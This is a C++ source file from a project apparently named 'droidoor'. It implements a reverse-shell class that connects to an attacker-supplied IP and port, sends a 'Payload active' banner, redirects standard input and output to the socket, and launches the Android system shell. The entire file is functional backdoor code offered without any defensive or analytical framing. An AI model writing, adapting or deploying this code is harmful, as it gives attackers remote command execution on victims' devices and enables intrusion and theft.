#ifndef TCP_KEEPIDLE
    #ifdef TCP_KEEPALIVE
        #define TCP_KEEPIDLE TCP_KEEPALIVE
    #else
        #define TCP_KEEPIDLE 4
    #endif
#endif

#ifndef TCP_KEEPINTVL
    #define TCP_KEEPINTVL 5
#endif
#ifndef TCP_KEEPCNT
    #define TCP_KEEPCNT 6
#endif

#include "src/droidoor/rshell.hpp"
#include <cstdint>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <iostream>
#include <stdexcept>
#include <string>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/tcp.h>


namespace droidoor
{
 ReverseShell::ReverseShell(const std::string& ip, uint16_t port){
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        throw std::runtime_error("Failed to open socket: " + std::to_string(errno));
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip.c_str());
 }   
 void ReverseShell::setup_connect(){
    if (is_connected){
        throw std::runtime_error("Already connected !");
    }
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

    int idle = 30; 
    int intvl = 10;
    int cnt = 3;

    setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &idle, sizeof(idle));
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &intvl, sizeof(intvl));
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &cnt, sizeof(cnt));
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0){

        msg = "Payload active !\nWelcome to droidoor reverse shell\n";
        send(sock, msg.data(), msg.size(), MSG_NOSIGNAL);
        is_connected = true;
    }
    else {
        throw std::runtime_error("Failed to connect: " + std::to_string(errno));
    }

 }
 void ReverseShell::spawn_shell(const std::string& shell_name){
    if (!is_connected){
        throw std::runtime_error("Cannot to spawn shell before connection !");
    }
    if (is_shell_spawned){
        throw std::runtime_error("Failed to spawn shell: already spawned");
    }

    shell_pid = fork();
    if (shell_pid < 0) {
        throw std::runtime_error("Failed to fork process: " + std::to_string(errno));
    }

    if (shell_pid == 0){
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        if (shell_name.size() == 0){
            execl("/system/bin/sh", "sh", nullptr);
        } else {
            execl(shell_name.c_str(), shell_name.c_str(), nullptr);
        }

        _exit(1);

    } else {
        int status;
        waitpid(shell_pid, &status, 0);

        is_connected = false;
        is_shell_spawned = false;
    }

    
 }
 ReverseShell::~ReverseShell(){
    if (is_connected){
        shutdown(sock, SHUT_RDWR);
        close(sock);
        is_connected = false;
    }
 }

} // namespace droidoor
